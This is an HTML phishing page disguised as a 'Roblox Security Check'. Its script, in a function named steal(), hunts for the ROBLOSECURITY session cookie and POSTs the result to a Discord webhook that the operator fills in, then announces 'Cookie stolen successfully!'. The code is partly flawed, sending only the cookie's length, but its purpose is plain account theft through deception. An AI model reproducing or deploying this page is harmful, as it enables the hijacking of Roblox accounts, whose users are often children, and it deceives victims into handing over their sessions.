<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox Security Check</title>
    <style>
        body { 
            background-color: #232527; /* Roblox Dark Theme */
            color: white; 
            font-family: 'Segoe UI', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
        }
        .container { text-align: center; background: #2f3136; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); max-width: 400px;}
        h1 { color: #ffffff; margin-bottom: 10px; }
        p { color: #b9bbbe; font-size: 14px; }
        .btn { 
            background-color: #00b894; 
            border: none; 
            padding: 15px 30px; 
            color: white; 
            font-weight: bold; 
            cursor: pointer; 
            border-radius: 5px; 
            margin-top: 20px;
            transition: 0.2s;
        }
        .btn:hover { background-color: #01a384; transform: scale(1.05); }
        .status { margin-top: 15px; font-size: 12px; color: #fbc531; height: 20px;}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Roblox Security Check</h1>
        <p>We need to verify your session before you can continue.</p>
        <button class="btn" onclick="steal()">Verify Session Now</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        // 1. PASTE YOUR WEBHOOK URL HERE
        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 

        function steal() {
            document.getElementById('status').innerText = "Verifying...";
            
            // 2. Get the ROBLOSECURITY Cookie specifically
            let cookie = "";
            try {
                // Look for the specific Roblox session cookie
                const cookies = document.cookie.split(";");
                for (let i = 0; i < cookies.length; i++) {
                    let cookiePair = cookies[i];
                    while (cookiePair.charAt(0) === " ") {
                        cookiePair = cookiePair.substring(1);
                    }
                    
                    // Check if this is the Roblox session cookie
                    if (cookiePair.indexOf("ROBLOSECURITY") !== -1 || 
                        cookiePair.indexOf("__Secure-ROBLOSECURITY") !== -1) {
                        
                        // Extract just the value part after the name=
                        let parts = cookiePair.split("=");
                        if(parts.length > 1) {
                            cookie = parts[1];
                            break;
                        } else {
                            cookie = cookiePair;
                            break;
                        }
                    }
                }
            } catch (e) {
                console.log("Cookie access error: " + e);
            }

            if (!cookie || cookie.length < 10) {
                // Debug info for you to see in console
                console.log("Current Cookies:", document.cookie);
                
                alert("Session not found! Make sure:\n1. You are logged into Roblox.\n2. The page is loaded via HTTPS (https://).\n3. Try opening the link from a new tab.");
                return;
            }

            // 3. Send to Discord
            const payload = JSON.stringify({
                content: "🔐 **New Cookie Detected!**",
                embeds: [{
                    title: "Roblox Session Leak",
                    color: 16752000,
                    fields: [
                        { name: "Username (Approx)", value: document.title || "Unknown", inline: true },
                        { name: "Cookie Length", value: cookie.length + " characters", inline: false } 
                    ]
                }]
            });

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('status').innerText = "✅ Success! Cookie sent.";
                    alert("Cookie stolen successfully!");
                } else {
                    throw new Error();
                }
            })
            .catch(err => {
                console.error(err);
                document.getElementById('status').innerText = "❌ Failed to send data.";
            });
        }
    </script>
</body>
</html>
